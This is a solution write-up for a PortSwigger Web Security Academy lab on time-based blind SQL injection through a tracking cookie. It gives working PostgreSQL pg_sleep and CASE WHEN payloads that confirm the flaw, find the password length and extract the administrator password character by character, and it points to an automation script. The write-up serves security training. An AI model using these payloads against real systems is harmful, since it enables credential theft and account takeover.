# Blind SQL injection with time delays and information retrieval

**Lab Url**: [https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

## Objective

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Solution

The application is vulnerable to blind SQL injection via the tracking cookie. Since responses are indistinguishable regardless of the query result, we use conditional time delays (`pg_sleep`) to infer information one bit at a time.

### Step 1: Confirm the time-delay

PostgreSQL's `pg_sleep()` pauses execution for a given number of seconds. Inject a 10-second delay to confirm the vulnerability:

```http
Cookie: TrackingId='; SELECT pg_sleep(10)--
```

A ~10 second response delay confirms blind SQL injection.

### Step 2: Craft a conditional delay

Use `CASE WHEN` to trigger a delay only when a condition is true:

```http
Cookie: TrackingId='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

A 5-second delay confirms true; instant response means false.

### Step 3: Determine the password length

Test each possible length by adding `AND LENGTH(password)=N`:

```http
Cookie: TrackingId='; SELECT CASE WHEN (username='administrator' AND LENGTH(password)=N) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```

When the response takes ~5 seconds, `N` is the correct length.

### Step 4: Extract the password character by character

Use `SUBSTRING(password, N, 1)` to test each character at each position:

```http
Cookie: TrackingId='; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
Cookie: TrackingId='; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,2,1)='b') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
...
```

A ~5-second delay means the guessed character is correct.

### Step 5: Login

Log in as `administrator` with the recovered password to solve the lab.

---

**Automation script:** A Python script is available at [`lab_15_script.py`](./scripts/lab_15_script.py) that automates the entire process:

```bash
python3 lab_15_script.py -u https://LAB-ID.web-security-academy.net/ -s YOUR-SESSION-COOKIE
```
